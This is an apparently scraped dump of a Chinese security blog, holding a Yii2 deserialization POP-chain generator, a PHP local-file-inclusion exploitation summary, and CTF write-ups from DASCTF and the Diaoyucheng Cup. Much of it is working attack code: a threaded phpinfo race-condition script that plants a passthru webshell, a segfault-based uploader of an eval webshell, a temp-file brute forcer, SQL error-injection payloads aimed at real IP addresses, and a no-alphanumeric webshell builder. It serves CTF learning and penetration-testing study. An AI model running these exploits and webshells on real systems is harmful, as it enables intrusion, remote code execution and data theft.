$this-&gt;id = &#x27;touch test.txt&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;render&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Faker\\Generator; class See&#123; protected $description; public function __construct() &#123; $this-&gt;description = new Generator(); &#125; &#125;&#125;namespace Symfony\\Component\\String&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class UnicodeString&#123; protected $string; public function __construct() &#123; $this-&gt;string = new See; &#125; &#125;&#125;namespace&#123; use Symfony\\Component\\String\\UnicodeString; echo base64_encode(serialize(new UnicodeString()));&#125; 有个问题是这个POP利用链回显的时候会报错，不能正常显示。 但是命令是成功执行的： 讲道理，应该还可以接着挖。 参考文章 https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg https://xz.aliyun.com/t/8307 https://www.anquanke.com/post/id/217930","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"menu","date":"2020-09-26T11:57:04.681Z","path":"menu/","text":"文章归档 置顶文章 Linux Enumeration Web安全 Web安全基础 在Ubuntu18.04安装LNMP MySQL数据库基本操作 MySQL的系统表、文件读写 数据库系统功能相关学习 数据库注入语句的收集和学习 Web页面解析的流程学习 各种注入类型的环境搭建和代码编写 Sqli-labs手工注入(一) Sqli-labs手工注入(二) SQLMap入门学习 SQL注入——双查询注入 XSS漏洞实战学习 文件包含漏洞利用 变量覆盖漏洞利用 文件上传漏洞利用 SSRF漏洞利用 命令执行漏洞利用 逻辑漏洞利用 XXE漏洞利用 NoSQL注入之MongoDB SQL注入专项之MySQL基本注入语法 浅谈LDAP注入攻击 MySQL攻击面和提权总结 SQL注入手册 Jinja2 SSTI&amp;Bypass Python沙箱逃逸 Python反序列化漏洞 PHP相关 PHP回调后门 PHP反序列化——基础篇 PHP反序列化——Phar PHP反序列化——Session PHP反序列化-原生类利用 PHP无数字字母构造webshell PHP无参数函数的利用 SoapClient+SSRF+CRLF利用 PHP复杂变量解析 PHP LFI to RCE session.upload-progress+LFI实现RCE Writeups CGCTF-Writeup BUUCTF—PHP代审 BUUCTF—PHP框架漏洞 BUUCTF—PHP反序列化 BUUCTF—SQL注入 BUUCTF—XSS BUUCTF—SSRF BUUCTF—命令执行 BUUCTF—文件上传 BUUCTF—文件包含 BUUCTF—Python BUUCTF—NodeJS BUUCTF—Ruby和Go BUUCTF—渗透测试 CTFShow—Web入门 2020电信天翼杯CTF—APITest 星盟6月AWD Web+Pwn DASCTF2020七月赛 Web CSICTF2020 Web+Linux 2020第五空间CTF Web 首届钓鱼城杯CTF DASCTF八月赛 CTFShow 1024杯 Web ByteCTF2020 Web UNCTF2020 Web 羊城杯2020 Web NCTF2019 Phar matches everything 纵横杯2020 Web BMZCTF2020 Web 靶机系列 HackTheBox HTB::OpenAdmin HTB::Postman HTB::Traverxec HTB::Obscurity HTB::Mongo HTB::Tenten HTB::Sneaky HTB::Teacher HTB::Irked HTB::Traceback HTB::DevOops HTB::Blocky HTB::Beep HTB::Book HTB::Magic HTB::Craft HTB::CTF HTB::Admirer VulnHub VulnHub::BossplayersCTF VulnHub::DC-1 VulnHub::DigitalWorld:JOY 代码审计 PHP代码审计 PHP代码审计学习—Day1 PHP代码审计学习—Day2 PHP代码审计学习—Day3 PHP代码审计学习—Day4 PHP代码审计学习—Day5 PHP代码审计复现—yixuncms PHP代码审计复现—chinaz CVE-2020-15148 Yii2反序列化 74CMS模板注入+文件包含getshell 【密文保护】PHPECMS3.5getshell ZZCMS8.2 maccms8.x 流量分析 Datacon2019-q1-wp-v1ß Datacon2019-q1-wp-v2 Bro语法学习之基础知识 机器学习 基础学习 Machine-Learning-Week1 Machine-Learning-Week2 Machine-Learning-Week3 机器学习与网络安全相关的资料（转） Python Python编程 Python函数的参数 Python函数式编程之高阶函数 Python函数式编程-闭包 Python函数式编程-装饰器 Python面向对象高级编程之slots、@property和多重继承 PythonIO编程 Java Java编程 Java基础学习之JDK、JRE、JVM Java基础学习之核心类 Java基础学习之面向对象基础 Java基础学习之异常处理 算法 Leetcode Leetcode-Primary-class 随笔 经验 从0到100分的路程——写在2019年的最后一天 技术 阿里云Centos7-Ngnix部署Hexo 阿里云OSS-PicGo搭建Markdown图床 Hexo渲染LaTeX数学公式 Git CheatSheet Tmux CheatSheet","tags":[],"categories":[]},{"title":"","date":"2020-09-26T11:57:04.671Z","path":"home/","text":"wiki1234567 _____ ___ _____ ___ _ _ _____ _ _____ _____ &#x2F; ___| &#x2F; | &#x2F; _ \\ |_ | | | | | | _ \\ | | &#x2F; _ \\ &#x2F; ___| | | &#x2F; &#x2F;| | | | | | | | | |_| | | |_| | | | | | | | | | | | &#x2F; &#x2F; | | | |&#x2F;| | | | | _ | | _ | | | | | | | | | _ | |___ &#x2F; &#x2F; | | | |_| | | | | | | | | |_| | | |___ | |_| | | |_| | \\_____| &#x2F;_&#x2F; |_| \\_____&#x2F; |_| |_| |_| |_____&#x2F; |_____| \\_____&#x2F; \\_____&#x2F; ca01h@星盟安全 NTExOTY1NzM4QHFxLmNvbQ== 互联网时代的知识是零散的，需要有一个写字的地方，把零散的知识汇聚起来，以点连线，以线聚面，一方面能形成一个完整的知识体系，另一方面自己所需之时方便查阅，于是乎就诞生了ca01hの笔记本。 TODO LIST 2020 【未完成】SCTF复盘：https://github.com/SycloverSecurity/SCTF2020/tree/master/Web 【未完成】Thinkphp-vuln November 【已完成】byteCTF2020 scrapy_redis复现 【未完成】未授权访问总结 **【未完成】 MySQL提权** 【未完成】漏洞复现 【未完成】MKCMS5.0审计 【未完成】CTFShow刷题 【未完成】DataCon复盘（阶段二） 【未完成】ThinkPHP-vuln复现 October 【已完成】Yii2反序列化POP链分析 【已完成】巅峰极客Babyback复盘 【未完成】DataCon复盘（阶段二） 【未完成】星盟公开课准备工作 【已完成】论文开题报告 【已完成】xmctf出题 【已完成】CTFShow刷题 【已完成】HTB Doctor靶机 September 【已完成】实习+HW 【已完成】DataCon复盘（阶段一） 【已完成】2020巅峰极客CTF August 【已完成】XCTF——WMCTF（有幸做了一个签到题 【已完成】DataCon2020 DNS恶意流量分析（有幸混了一个鼓励奖 DNS恶意域名分析 https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg 加密恶意流量检测 初赛：https://s1mple.online/2020/08/09/DataCon2020-加密恶意流量检测初赛-Writeup-及总结反思/ 僵尸网络分析 第一题：https://www.cdxy.me/?p=829 第三题：https://zhuanlan.zhihu.com/p/186948840 网络黑产分析 恶意代码分析 https://github.com/yuriufo/DataCon2020 https://zhuanlan.zhihu.com/p/187535672 https://zhuanlan.zhihu.com/p/185715807 【已完成】首届钓鱼城杯CTF 【已完成】HW 【已完成】文件解析漏洞 【未完成】《机器学习实战》前七章 【已完成】BUUCTF刷题 【未完成】HackTheBox OpenKeys（账号又被封了。。。 【已完成】PHP构造反序列化链再学习 July 【已完成】第五空间CTF复盘 【已完成】DASCTF七月赛复盘 【已完成】CSICTF2020复盘 【已完成】2020电信天翼杯CTF 【未完成】SUCTF2019 Upload2 【未完成】N1CTF2018 Easy&amp;&amp;Hard PHP https://xz.aliyun.com/t/2148 https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499 【未完成】Flask/Jinja2 SSTI &amp;&amp; Python 沙箱逃逸基础 【未完成】PHP写配置漏洞 【未完成】PHP弱类型比较 【未完成】Code Breaking 2018挑战赛学习——正则回溯 【已完成】HackTheBox Tabby 【已完成】HackTheBox Sneakymailer 【未完成】Flask Pin码安全 June 【已完成】RCTF2020（被完虐。。😭纯粹靠着队里的pwn师傅抬着走) 【已完成】PHP反序列化——Phar 【已完成】PHP反序列化——Session 【未完成】新春战役 Hackme：https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme filter_var绕过：https://www.secpulse.com/archives/67064.html 绕过四个字符限制getshell：https://www.anquanke.com/post/id/87203 【已完成】PHP反序列化——Soapclient LCTF bestphp’s revenge 【未完成】PHP反序列化——字符逃逸 【未完成】PHP反序列化——Bypass 【未完成】代码审计学习——PHP-Audit-Code Day1-6 【未完成】phpinfo中的关键信息 【未完成】Redis安全学习 【已完成】BUUCTF刷题 【已完成】XMCTF解题 【已完成】第五空间CTF比赛（2020.06.24）（菜就一个字。。。） 【已完成】队内AWD训练赛（2020.06.28） Awesome Articals/Projects Linux入侵检测 https://github.com/grayddq/GScan 红蓝对抗 https://github.com/yeyintminthuhtut/Awesome-Red-Teaming https://github.com/hudunkey/Red-Team-links 代码审计 https://github.com/CHYbeta/Code-Audit-Challenges https://github.com/hongriSec/PHP-Audit-Labs WAF https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/ https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756 java安全 https://github.com/threedr3am/learnjavabug Python安全 https://github.com/bit4woo/python_sec 字典 https://github.com/insightglacier/Dictionary-Of-Pentesting 求职 https://github.com/geekcompany/ResumeSample https://github.com/zhaoweiho/web-sec-interview https://github.com/EvilAnne/Pentest_questions Bypass &amp; Tricks PHP preg_match绕过 参考文章：https://www.cnblogs.com/20175211lyz/p/12198258.html 数组绕过 PCRE回溯限制（code-breaking2018） 换行符 PHP字符串解析特性绕过 参考文章：https://www.freebuf.com/articles/web/213359.html 借用一张图简单地记一下 SSRF file协议绕过 如果SSRF中file://关键字被禁用，可以使用file:/或者file:///来代替。 例题：[GKCTF2020]EZ三剑客-EzWeb Session绕过 删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的$_SESSION['var']就为NULL，相当于传参NULL。 例题：BJDCTF2nd 文件探测 利用数组绕过 1234567md5(Array()) = nullsha1(Array()) = nullereg(pattern,Array()) = nullpreg_match(pattern,Array()) = falsestrcmp(Array(), &quot;abc&quot;) = nullstrpos(Array(),&quot;abc&quot;) = nullstrlen(Array()) = null 例题：0CTF2016 piapiapia basename绕过 从 https://bugs.php.net/bug.php?id=62119 找到了basename()函数的一个问题，它会去掉文件名开头的非ASCII值： 12var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.phpvar_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php 例题：[Zer0pts2020]Can you guess it? .htaccess利用 https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks总结","tags":[],"categories":[]},{"title":"PHP LFI利用总结","date":"2020-09-21T02:17:16.000Z","path":"Web_security/php_related/12.PHP的LFI利用总结/","text":"PHP LFI利用总结 参考文章：https://www.anquanke.com/post/id/177491 proc/self/environ 前置条件 php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 利用方式 如果可以读取，修改User-Agent为php代码，然后lfi点包含，实现rce。 proc/self/fd/1,2,3… 前置条件 php以cgi方式运行。 environ文件存储位置已知，且environ文件可读。 类似于/proc/self/environ，不同是在referer或报错等写入php代码，然后lfi点包含，实现rce。 PHP伪协议 常用伪协议 expect:// 前置条件 默认不开启，需要安装PECL package扩展 需要allow_url_include开启 利用方式 1expect:&#x2F;&#x2F;[command] 日志 Apache日志 在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。 CTF实例： https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two with phpinfo 在可以访问phpinfo的情况下，疯狂上传大文件，同时在phpinfo中可以看到上传的文件在tmp目录下的文件名，条件竞争，在文件被删除之前包含进来getshell。 利用脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177#!/usr/bin/pythonimport sysimport threadingimport socketdef setup(host, port): TAG=&quot;Security Test&quot; PAYLOAD=&quot;&quot;&quot;%sr&lt;?php $c=fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;);fwrite($c,&#x27;&lt;?php passthru($_GET[&quot;f&quot;]);?&gt;&#x27;);?&gt;r&quot;&quot;&quot; % TAG REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;rContent-Type: text/plainrr%s-----------------------------7dbff1ded0714--r&quot;&quot;&quot; % PAYLOAD padding=&quot;A&quot; * 5000 REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714rContent-Length: %srHost: %srr%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script# LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s%%00 HTTP/1.1r# User-Agent: Mozilla/4.0r# Proxy-Connection: Keep-Aliver# Host: %sr# r# r# &quot;&quot;&quot; LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1rUser-Agent: Mozilla/4.0rProxy-Connection: Keep-AliverHost: %srrr&quot;&quot;&quot; return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = &quot;&quot; while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(&quot;[tmp_name] =&amp;gt&quot;) fn = d[i+17:i+31] # print fn except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fncounter=0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print &quot;nGot it! Shell created in /tmp/g&quot; self.event.set() except socket.error: returndef getOffset(host, port, phpinforeq): &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = &quot;&quot; while True: i = s.recv(4096) d+=i if i == &quot;&quot;: break # detect the final chunk if i.endswith(&quot;0rnrn&quot;): break s.close() i = d.find(&quot;[tmp_name] =&amp;gt&quot;) if i == -1: raise ValueError(&quot;No php tmp_name in phpinfo output&quot;) print &quot;found %s at %i&quot; % (d[i:i+10],i) # padded up a bit return i+256def main(): print &quot;LFI With PHPInfo()&quot; print &quot;-=&quot; * 30 if len(sys.argv) &lt; 2: print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print &quot;Error with port %d: %s&quot; % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e) sys.exit(1) print &quot;Getting initial offset...&quot;, reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print &quot;Spawning worker pool (%d)...&quot; % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( &quot;r% 4d / % 4d&quot; % (counter, maxattempts)) sys.stdout.flush() if counter &gt;= maxattempts: break print if e.is_set(): print &quot;Woot! m/&quot; else: print &quot;:(&quot; except KeyboardInterrupt: print &quot;nTelling threads to shutdown...&quot; e.set() print &quot;Shuttin&#x27; down...&quot; for t in tp: t.join()if __name__==&quot;__main__&quot;: main() with php崩溃 php segfault 向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留 1. php &lt; 7.2 php://filter/string.strip_tags/resource=/etc/passwd 2. php7 老版本通杀 php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA 利用脚本 123456789101112131415161718192021222324252627# -*- coding: utf-8 -*-# php崩溃 生成大量临时文件import requestsimport stringdef upload_file(url, file_content): files = &#123;&#x27;file&#x27;: (&#x27;test.jpg&#x27;, file_content, &#x27;image/jpeg&#x27;)&#125; try: requests.post(url, files=files) except Exception as e: print echarset = string.digits+string.letterswebshell = &#x27;&lt;?php eval($_REQUEST[daolgts]);?&gt;&#x27;.encode(&quot;base64&quot;).strip()file_content = &#x27;&lt;?php if(file_put_contents(&quot;/tmp/daolgts&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;success&quot;;&#125;?&gt;&#x27; % (webshell)url=&quot;&quot;parameter=&quot;&quot;payload1=&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;payload2=r&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;lfi_url = url+&quot;?&quot;+parameter+&quot;=&quot;+payload1length = 6times = len(charset) ** (length / 2)for i in xrange(times): print &quot;[+] %d / %d&quot; % (i, times) upload_file(lfi_url, file_content) 爆破tmp文件名 然后爆破临时文件名来包含 12345678910111213141516171819202122232425# -*- coding: utf-8 -*-import requestsimport stringcharset = string.digits + string.lettersbase_url=&quot;&quot;parameter=&quot;&quot;for i in charset: for j in charset: for k in charset: for l in charset: for m in charset: for n in charset: filename = i + j + k + l + m + n url = base_url+&quot;?&quot;+parameter+&quot;=/tmp/php&quot;+filename print url try: response = requests.get(url) if &#x27;success&#x27; in response.content: print &quot;[+] Include success!&quot; print &quot;url:&quot;+url exit() except Exception as e: print e session 利用条件 session文件路径已知，且其中内容部分可控。 利用方式 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与session.upload_progress.name连接在一起的值。 也就是说session中会添加session.upload_progress.prefix+$_POST[ini_get['session.upload_progress.name']],而session.upload_progress.name是可控的，所以就可以在session写入php代码，然后包含session文件来rce","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"DASCTF八月赛WP","date":"2020-09-05T11:53:18.000Z","path":"Web_security/ctf_writeup/23.DASCTF2020八月赛/","text":"DASCTF八月赛 Web Writeup 安恒大学 考点 渗透测试 SQL报错注入 解题 y1ng师傅出的一道题，非常顶，可以说是这是一道实战改编题，y1ng师傅在做渗透测试时，在一个系统的某个不起眼的地方——邮件激活链接发现了SQL注入，并得到了全校所有学生的内网平台账号密码，而学生的所有信息、所有网上办事等等几乎都使用校内网平台的账号密码。 其实比赛的时候主办方也提醒了邮箱不要随便填，不过当时还是没能察觉到邮件激活链接中的一个参数存在SQL注入。 现在正式解题，直接看邮件激活链接： 1http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;ca01h&amp;token&#x3D;cf42313ae7812e9234d5b378f095e688 注入点在username参数，说一下我的解题过程： 首先使SQL语句报错 再尝试万能注入payload： 好像可以使用盲注，再尝试ca01h2' or if(length(select database())&gt;1, 1, 0)--+，结果直接SQL语句报错 盲注不行，联合注入被过滤，那么接着试一下报错注入： 成功爆出当前用户名，接下来的工作就是拿数据。 爆表名： 1ca01h2&#39; and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)))--+ 一共有三个表：student, teachers, users 爆列名： 1ca01h2&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39; limit 0,1),0x7e)))--+ student表一共四个字段：id, username, age, sex teachers表：id, f1aaaag, 爆数据： 1ca01h2&#39; and (extractvalue(1,concat(0x7e,(select reverse(f1aaaag) from teachers limit 11,1),0x7e)))--+ rceme 考点 无字母数字webshell 解题 1234567891011121314&lt;?phperror_reporting(0);show_source(__FILE__);$code=$_POST[&#x27;code&#x27;];$_=array(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;@&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;,&#x27;\\[&#x27;,&#x27;\\]&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\*&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;0&#x27;);//This blacklist is so stupid.$blacklist = array_merge($_);foreach ($blacklist as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $code)) &#123; die(&#x27;you are not smart&#x27;); &#125;&#125;eval(&quot;echo($code)&quot;);?&gt; 过滤了所有字母数字和部分逻辑运算符以及常用于构造webshell的^、~、&amp;等符号。 但是还有一个逻辑运算符放出来了 |或运算。 payload： 1code&#x3D;(&#39;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#39;|&#39;\u0012\u0005\u0001\u0004\u0006 \u0005&#39;)(&#39;&#x2F;&#96;&#96;&#96;&#96;&#39;|&#39;&#x2F;\u0006 \u0001\u0007&#39;));&#x2F;&#x2F; 应该是可以用python脚本fuzz出来的。 y1ng师傅的方法，直接不用或运算符，TQLLLLLL，代码看不太懂，膜就完事。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python3#-*- coding:utf-8 -*-#__author__: 颖奇L&#x27;Amore www.gem-love.comimport requestsfrom urllib.parse import quote_plusdef g(payload, buff): offset = 3 + buff res = &quot;&quot; base = 65 for i in range(len(payload)): if payload[i] == &#x27;_&#x27; or payload[i] == &#x27;/&#x27;: continue _ascii = ord(payload[i]) #init underline = &quot;$&quot; + (&quot;_&quot; * (i + offset)) undefined = &quot;$&quot; + (&quot;_&quot; * (len(payload) + offset + 15)) var = f&quot;++&#123;underline&#125;;$__-=&#123;underline&#125;;$__++;&#123;underline&#125;/=$__;&#123;underline&#125;=((&#123;undefined&#125;/&#123;undefined&#125;).&#123;underline&#125;)&quot;+r&quot;&#123;++$__&#125;;$__--;&quot; res += var; tmp = &#x27;&#x27; if _ascii &gt; base: for i in range(_ascii-base): tmp = tmp + f&quot;++&#123;underline&#125;;&quot; res += tmp first = &quot;$&quot; + (&quot;_&quot; * offset) for i in range(1, len(payload)): if payload[i] == &#x27;_&#x27;: res += f&quot;&#123;first&#125;.=&#x27;_&#x27;;&quot; continue if payload[i] == &#x27;/&#x27;: res += f&quot;&#123;first&#125;.=&#x27;/&#x27;;&quot; continue final_var = &quot;$&quot; + (&quot;_&quot; * (i + offset)) res += f&quot;&#123;first&#125;.=&#123;final_var&#125;;&quot; return [res, &quot;$&quot; + &quot;_&quot; * (offset)]pre = &quot;&#x27;&#x27;);&quot;after = &#x27;//&#x27;buff = len(&#x27;STRTOLOWERSHOW_SOURCE&#x27;)flag = g(&quot;/FLAG&quot;, buff)buff = len(&#x27;STRTOLOWER&#x27;)showsource = g(&quot;SHOW_SOURCE&quot;, buff)buff = 0strtolower = g(&#x27;STRTOLOWER&#x27;, buff)final = &#x27;&#x27;#1.构造STRTOLOWER并存进变量afinal += strtolower[0]a = strtolower[1] # a = &#x27;$___&#x27; # STRTOLOWER#2.构造SHOW_SOURCE并存进变量bfinal += showsource[0]b = showsource[1] # b = &#x27;$_____________&#x27; #SHOW_SOURCE#3.构造/FLAG并存进变量cfinal += flag[0] + flag[1] + &quot;=&#x27;/&#x27;.&quot; + flag[1] + &#x27;;&#x27;c = flag[1] # c = &#x27;$________________________&#x27; #/FLAG#声明好abc变量padding = f&#x27;$______________________________________________=&#123;a&#125;;$_______________________________________________=&#123;b&#125;;$________________________________________________=&#123;c&#125;;&#x27;final += padding# 4.变量d = a(c) 则变量d为/flagd = &quot;$______________________________________________($________________________________________________);&quot;padding = &#x27;$_________________________________________________=&#x27;+dfinal += padding#5. b(d) 即为SHOW_SOURCE(&#x27;/flag&#x27;)final += &#x27;$_______________________________________________($_________________________________________________);&#x27;final = pre + finalfinal = final + afterprint(final.replace(&#x27;+&#x27;, &#x27;%2b&#x27;)) ezflask TODO Reference https://www.gem-love.com/ctf/2598.html http://phoebe233.cn/?p=248 https://rce.moe/2020/08/25/GeekPwn-2020-云上挑战赛-cosplay-writeup/","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"首届钓鱼城杯CTF比赛","date":"2020-08-28T12:28:36.000Z","path":"Web_security/ctf_writeup/22.首届钓鱼城杯CTF/","text":"“钓鱼城杯”国际网络安全技能大赛Writeup easyseed index.bak： 12345678910$lock = random(6, &#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;);$key = random(16, &#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;);function random($length, $chars = &#x27;0123456789ABC&#x27;) &#123; $hash = &#x27;&#x27;; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) &#123; $hash .= $chars[mt_rand(0, $max)]; &#125; return $hash;&#125; 使用php_mt_rand随机数种子爆破。 用脚本生成php_mt_rand工具的参数： 1234567891011str1 = &#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;str2 = &#x27;vEUHaY&#x27;str3 = str1[::-1]length = len(str2)res = &#x27;&#x27;for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res += str(j) + &#x27; &#x27; + str(j) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27; breakprint(res) 爆破seed 再生成key值 12345678910111213mt_srand(&#x27;718225&#x27;);$lock = random(6, &#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;);$key = random(16, &#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;);echo $lock.PHP_EOL;echo $key;function random($length, $chars = &#x27;0123456789ABC&#x27;) &#123; $hash = &#x27;&#x27;; $max = strlen($chars) - 1; for($i = 0; $i &lt; $length; $i++) &#123; $hash .= $chars[mt_rand(0, $max)]; &#125; return $hash;&#125; 发送payload： 1234567891011import requestsurl = &#x27;&#x27;&#x27;http://122.112.252.28:20001/&#x27;&#x27;&#x27;cookies = &#123; &#x27;key&#x27;: &#x27;nRtqGR8mtd9ZOPyI&#x27;, &#x27;lock&#x27;: &#x27;vEUHaY&#x27;&#125;headers = &#123; &#x27;X-Forwarded-For&#x27;: &#x27;127.0.0.1&#x27;&#125;res = requests.get(url=url, cookies=cookies, headers=headers)print(res.text) easyweb 抓包 然后无回显命令执行，然后盲注一下 123456789101112131415161718import requestsfrom time import timeurl = &#x27;http://119.3.37.185/&#x27;payload = &#x27;if [ `cut -c &#123;num1&#125; /flag.txt` = &quot;&#123;num2&#125;&quot; ];then sleep 2;fi&#x27;flag = &#x27;&#x27;for i in 